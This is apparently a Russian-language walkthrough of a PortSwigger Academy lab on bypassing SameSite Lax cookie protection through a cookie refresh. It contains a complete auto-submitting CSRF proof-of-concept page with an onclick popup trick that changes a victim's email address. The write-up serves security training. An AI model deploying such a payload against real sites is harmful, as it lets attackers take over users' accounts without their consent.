залогинимся под `wiener:peter`

И после череды всех редиректов изменим почтовый ящик на `change@me.com`

найдем в `Proxy` -> `HTTP history` данный запрос по смене почтового ящика и отправим его в `Repeater`
```
POST /my-account/change-email HTTP/2
...
email=change%40me.com
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/10.%20SameSite%20Lax%20bypass%20via%20cookie%20refresh/pics%20for%20walkthrough/1.png)

Далее нажмем на данный запрос `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC `
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aae00c90340112080d858ff002100e1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/10.%20SameSite%20Lax%20bypass%20via%20cookie%20refresh/pics%20for%20walkthrough/2.png)
Так как после аутентификации было несколько `Continue` кнопок добавим в наш пейлоад

```
<script>
window.onclick= () => {
	window.open("https://0aae00c90340112080d858ff002100e1.web-security-academy.net/my-account/change-email")
	}
</script>
```
В итоге наш PoC будет иметь следующий вид
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
	<script>
		window.onclick= () => {
		window.open("https://0aae00c90340112080d858ff002100e1.web-security-academy.net/my-account/change-email")
		}
		</script>
    <form action="https://0aae00c90340112080d858ff002100e1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change2&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Перейдем в `Exploit server`, нажмем `Store` и `Deliver Exploit to vicim` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/10.%20SameSite%20Lax%20bypass%20via%20cookie%20refresh/pics%20for%20walkthrough/3.png)
